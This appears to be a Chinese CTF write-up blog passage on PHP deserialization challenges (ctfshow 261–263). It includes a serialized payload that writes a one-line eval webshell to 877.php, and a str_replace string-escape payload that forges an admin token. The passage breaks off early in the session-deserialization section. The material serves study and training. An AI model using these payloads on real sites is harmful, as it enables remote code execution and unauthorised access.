<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>{			<span class="comment">//&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x8C03;&#x7528;</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&apos;&apos;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&apos;&apos;</span>){</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&apos;error&apos;</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>{			<span class="comment">//&#x4EE5;&#x51FD;&#x6570;&#x7684;&#x65B9;&#x5F0F;&#x8C03;&#x7528;&#x67D0;&#x4E2A;&#x5BF9;&#x8C61;</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>{		<span class="comment">//&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x8C03;&#x7528;</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&apos;&apos;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&apos;&apos;</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&apos;username&apos;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&apos;password&apos;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>){</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;username, <span class="variable language_">$this</span>-&gt;password);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&apos;vip&apos;</span>]);</span><br></pre></td></tr></table></div></figure>



<p>&#x4E0B;&#x9762;&#x8FD9;&#x4E2A;&#x4EE3;&#x7801;&#x5757;&#x662F;&#x522B;&#x4EBA;&#x7684;&#x7B14;&#x8BB0;&#x3002;&#x3002;</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x5982;&#x679C;&#x7C7B;&#x4E2D;&#x540C;&#x65F6;&#x5B9A;&#x4E49;&#x4E86; <span class="title function_ invoke__">__unserialize</span>() &#x548C; <span class="title function_ invoke__">__wakeup</span>() &#x4E24;&#x4E2A;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#xFF0C;</span><br><span class="line">&#x5219;&#x53EA;&#x6709; <span class="title function_ invoke__">__unserialize</span>() &#x65B9;&#x6CD5;&#x4F1A;&#x751F;&#x6548;&#xFF0C;<span class="title function_ invoke__">__wakeup</span>() &#x65B9;&#x6CD5;&#x4F1A;&#x88AB;&#x5FFD;&#x7565;&#x3002;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x53EA;&#x8981;&#x6EE1;&#x8DB3;code==<span class="number">0x36d</span>(<span class="number">877</span>)&#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#x3002;</span><br><span class="line">&#x800C;code&#x662F;username&#x548C;password&#x62FC;&#x63A5;&#x51FA;&#x6765;&#x7684;&#x3002;</span><br><span class="line">&#x6240;&#x4EE5;&#x53EA;&#x8981;username=<span class="number">877</span>.php password=shell&#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#x3002;</span><br><span class="line"><span class="number">877</span>.php==<span class="number">877</span>&#x662F;&#x6210;&#x7ACB;&#x7684;&#xFF08;&#x5F31;&#x7C7B;&#x578B;&#x6BD4;&#x8F83;&#xFF09;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>&#x8FD9;&#x91CC;&#x5F00;&#x59CB;&#x662F;&#x6211;&#x7684;&#x7B14;&#x8BB0;</p>
<blockquote>
<p>PHP&#x5728;&#x6700;&#x8FD1;&#x7684;&#x7248;&#x672C;&#x91CC;&#x9762;&#xFF08;&#x5927;&#x6982;&#xFF09;&#xFF0C;&#x6267;&#x884C;&#x4E86;unserialize&#x65B9;&#x6CD5;&#x540E;&#x662F;&#x4E0D;&#x4F1A;&#x6267;&#x884C;<code>__wakeup</code>&#x65B9;&#x6CD5;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x8BE5;&#x65B9;&#x6CD5;&#xFF1B;</p>
<ul>
<li>&#x5173;&#x4E8E;&#x8FD9;&#x4E2A;wakeup&#x6709;&#x4E2A;&#x5F88;&#x8001;&#x7684;&#x7ED5;&#x8FC7;&#x65B9;&#x6CD5;&#xFF0C;&#x4F3C;&#x4E4E;&#x662F;php5.5&#x7248;&#x672C;&#x4EE5;&#x524D;&#xFF0C;&#x82E5;&#x5BF9;&#x8C61;&#x5C5E;&#x6027;&#x4E2A;&#x6570;&#x4E0D;&#x4E00;&#x81F4;&#x4E5F;&#x53EF;&#x4EE5;&#x5F62;&#x6210;&#x6F0F;&#x6D1E;</li>
</ul>
<p>&#x8FD9;&#x91CC;&#x5C31;&#x662F;&#x4F7F;&#x7528;construct&#x548C;destruct&#xFF0C;&#x7136;&#x540E;&#x6700;&#x540E;&#x4E00;&#x53E5;unserailize&#x65B9;&#x6CD5;&#x5B9E;&#x9645;&#x4E0A;&#x8C03;&#x7528;&#x7684;&#x662F;ctfshowvip&#x8FD9;&#x4E2A;&#x7C7B;&#x91CC;&#x9762;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5F62;&#x53C2;&#x662F;$data,&#x5B9E;&#x53C2;&#x662F;get</p>
<p>&#x8FD9;&#x91CC;&#x7684;destruct&#x91CC;&#x9762;&#x4F7F;&#x7528;&#x4E86;<code>==</code>&#x5F31;&#x7C7B;&#x578B;&#x6BD4;&#x8F83;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x62FC;&#x63A5;&#x4EFB;&#x610F;&#x5B57;&#x7B26;&#x4E32;0x36d&#x5C31;&#x662F;877,<code>0x36d=877       0x36d=877.php           0x36d=877.php&lt;?php $_POST[ra];?&gt;</code>  &#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x62FC;&#x63A5;PHP&#x548C;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#xFF0C;&#x7136;&#x540E;&#x6267;&#x884C;file_put_contents&#xFF0C;&#x8FBE;&#x5230;&#x5199;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x7684;&#xFF0C;&#x901A;&#x8FC7;&#x8BBF;&#x95EE;877.php,&#x5B9E;&#x73B0;post&#x4F20;&#x53C2;&#xFF0C;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x76EE;&#x7684;</p>
<ul>
<li>&#x7136;&#x540E;&#x53C8;&#x56E0;&#x4E3A;construct&#x51FD;&#x6570;&#x8981;&#x6C42;&#x4F20;&#x53C2;&#xFF0C;&#x6240;&#x4EE5;&#x672C;&#x5730;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x4E3A;&#x4E86;&#x8C03;&#x7528;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x5C31;&#x8BA9;u&#x548C;p&#x4E3A;&#x7A7A;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x4E0D;&#x4F1A;&#x62A5;&#x9519;</li>
<li>&#x5728;construct&#x91CC;&#x9762;&#x7ED9;username&#x548C;password&#x8D4B;&#x503C;</li>
</ul>
</blockquote>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A10%3A%22ctfshowvip%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A25%3A%22%3C%3Fphp+eval%28%24_POST%5Bra%5D%29%3B%3F%3E%22%3Bs%3A4%3A%22code%22%3BN%3B%7D</span><br></pre></td></tr></table></div></figure>

<p>payload</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>=<span class="string">&apos;&apos;</span>,<span class="variable">$p</span>=<span class="string">&apos;&apos;</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&apos;877.php&apos;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&apos;&lt;?php eval($_POST[ra]);?&gt;&apos;</span>;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&apos;username&apos;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&apos;password&apos;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$vip</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">ctfshowvip</span>()));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$vip</span>;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>




        <h3 id="262">
          <a href="#262" class="heading-link"><i class="fas fa-link"></i></a><a href="#262" class="headerlink" title="262"></a>262</h3>
      <p>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x9003;&#x9038;&#xFF0C;&#x8BA9;&#x5B57;&#x7B26;&#x4E32;&#x53D8;&#x957F;</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&apos;user&apos;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&apos;f&apos;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&apos;m&apos;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&apos;t&apos;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>)){</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title class_">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&apos;fuck&apos;</span>, <span class="string">&apos;loveU&apos;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&apos;msg&apos;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&apos;Your message has been sent&apos;</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>message.php</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&apos;flag.php&apos;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&apos;user&apos;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&apos;msg&apos;</span>])){</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&apos;msg&apos;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&apos;admin&apos;</span>){</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>get&#x4E09;&#x4E2A;&#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x4F1A;&#x6839;&#x636E;get&#x7684;&#x6570;&#x636E;&#x81EA;&#x5DF1;&#x521B;&#x5EFA;cookie&#xFF0C;&#x5F53;message.php&#x91CC;&#x9762;&#x76D1;&#x6D4B;&#x5230;cookie&#x4E2D;&#x7684;&#x503C;token=&#x201D;admin&#x201D;,&#x5C31;&#x4F1A;&#x56DE;&#x663E;flag</p>
<ul>
<li>&#x9700;&#x8981;&#x5F97;&#x5230;admin &#x7684;&#x503C;&#xFF0C;&#x6CA1;&#x6CD5;&#x4F7F;&#x7528;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#xFF08;__construct&#xFF09;&#x6539;&#x53D8;&#x4F20;&#x5165;&#x7684;&#x5C5E;&#x6027;&#x7684;&#x503C;&#xFF0C;&#x5373;&#x4E0D;&#x80FD;&#x5BF9;&#x8C61;&#x6CE8;&#x5165;</li>
<li>&#x8003;&#x8651;&#x5B57;&#x7B26;&#x4E32;&#x9003;&#x9038;</li>
<li>from&#xFF0C;msg,to&#x4E09;&#x4E2A;&#x5C5E;&#x6027;&#x90FD;&#x53EF;&#x6CE8;&#x5165;&#xFF0C;&#x968F;&#x4FBF;&#x9009;&#x4E00;&#x4E2A;</li>
<li>&#x76EE;&#x7684;&#xFF1A;&#x5C06;admin&#x7684;&#x503C;&#x6DFB;&#x52A0;&#x5230;&#x5E8F;&#x5217;&#x5316;&#x540E;&#x7684;&#x503C;&#xFF0C;&#x7136;&#x540E;&#x5403;&#x6389;user&#x8FD9;&#x4E2A;&#x503C;&#xFF08;&#x6D89;&#x53CA;&#x77E5;&#x8BC6;&#x70B9;&#xFF1A;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x9047;&#x5230;}&#x5C31;&#x7ED3;&#x675F;&#xFF0C;&#x4E0D;&#x4F1A;&#x518D;&#x53CD;&#x5E8F;&#x5217;&#x5316;}&#x540E;&#x9762;&#x7684;&#x503C;&#xFF0C;&#x6240;&#x4EE5;&#x8003;&#x8651;&#x5B57;&#x7B26;&#x4E32;&#x9003;&#x9038;&#x65F6;&#x4F7F;&#x7528;}&#xFF09;</li>
<li>&#x6784;&#x9020;&#x4F20;&#x5165;&#x7684;admin&#xFF1A;<ul>
<li>3;&#x201D;s:5:&#x201D;token&#x201D;;s:5&#x201D;admin&#x201D;;}</li>
<li>&#x7531;&#x4E8E;&#x539F;&#x672C;&#x7684;<code>&quot;3&quot;</code>&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x4E0E;s&#x8BA1;&#x6570;&#x4E0D;&#x7B26;&#x5408;&#xFF0C;&#x6240;&#x4EE5;&#x8003;&#x8651;fuck&#x548C;loveu&#x7684;&#x66FF;&#x6362;&#xFF0C;&#x56DB;&#x4E2A;&#x5B57;&#x7B26;&#x6362;5&#x4E2A;&#x5B57;&#x7B26;&#xFF1B;</li>
<li>&#x53EA;&#x9700;&#x8981;&#x6DFB;&#x52A0;27&#x4E2A;fuck&#x5C31;&#x53EF;&#x4EE5;&#x4E86;</li>
</ul>
</li>
<li>&#x4F20;&#x8FDB;&#x65F6;&#xFF0C;fuck&#x6709;27&#x4E2A;&#xFF0C;&#x5171;108&#x4E2A;&#xFF0C;&#x6362;&#x6210;loveu&#x540E;&#x6709;135&#x4E2A;&#xFF0C;&#x76F8;&#x51CF;&#x521A;&#x597D;&#x4E3A;27&#x4E2A;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6267;&#x884C;&#x4E86;str_replace&#x51FD;&#x6570;&#x540E;&#xFF0C;&#x591A;&#x51FA;&#x6765;&#x7684;27&#x4E2A;&#x4F4D;&#x7F6E;&#x4E3A;admin&#x90A3;&#x4E32;payload&#x817E;&#x4F4D;&#x7F6E;&#xFF0C;&#x9884;&#x9632;&#x903B;&#x8F91;&#x9519;&#x8BEF;&#x800C;&#x62A5;&#x9519;</li>
<li>&#x4F20;&#x53C2;&#xFF0C;&#x6CE8;&#x610F;&#x4F20;&#x9012;&#x7684;&#x4E0D;&#x662F;&#x5E8F;&#x5217;&#x5316;&#x540E;&#x7684;&#x503C;&#xFF0C;&#x800C;&#x662F;payload&#xFF01;&#xFF01;</li>
</ul>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">message</span></span>{        </span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$from</span> = <span class="string">&apos;1&apos;</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$msg</span> = <span class="string">&apos;2&apos;</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$to</span> = <span class="string">&apos;3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}&apos;</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$token</span> = <span class="string">&apos;user&apos;</span>;        </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">message</span>();</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&apos;fuck&apos;</span>, <span class="string">&apos;loveU&apos;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>



<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;message&quot;:4:{s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:28:&quot;3&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">O:7:&quot;message&quot;:4:{s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:136:&quot;3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>



<hr>

        <h3 id="263">
          <a href="#263" class="heading-link"><i class="fas fa-link"></i></a><a href="#263" class="headerlink" title="263"></a>263</h3>
      <p>&#x8003;&#x70B9;&#xFF1A;PHPsession&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x76F8;&#x5173;</p>
<p>==<strong>&#x8FD9;&#x79CD;&#x7531;&#x4E8E;&#x5E8F;&#x5217;&#x5316;&#x548C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x4E0D;&#x4E00;&#x6837;&#x7684;&#x5F15;&#x64CE;&#x5C31;&#x662F;&#x9020;&#x6210;PHP Session&#x5E8F;&#x5217;&#x8BDD;&#x6F0F;&#x6D1E;&#x7684;&#x539F;&#x56E0;</strong>==</p>
<hr>
<p>session&#x7684;&#x76F8;&#x5173;&#x77E5;&#x8BC6;&#xFF08;&#x770B;&#x4F60;&#x80FD;&#x8BB0;&#x591A;&#x5C11;&#x5427;&#xFF09;</p>
<blockquote>
<p> SID&#x4E5F;&#x5C31;&#x662F;&#x5B89;&#x5168;&#x6807;&#x8BC6;&#x7B26;&#xFF08;Security Identifiers&#xFF09;&#xFF0C;&#x662F;&#x6807;&#x8BC6;&#x7528;&#x6237;&#x3001;&#x7EC4;&#x548C;&#x8BA1;&#x7B97;&#x673A;&#x5E10;&#x6237;&#x7684;&#x552F;&#x4E00;&#x7684;&#x53F7;&#x7801;&#x3002;</p>
</blockquote>
<p>&#x4F7F;&#x7528;session&#x8981;&#x914D;&#x7F6E;&#x7684;&#x9009;&#x9879;</p>
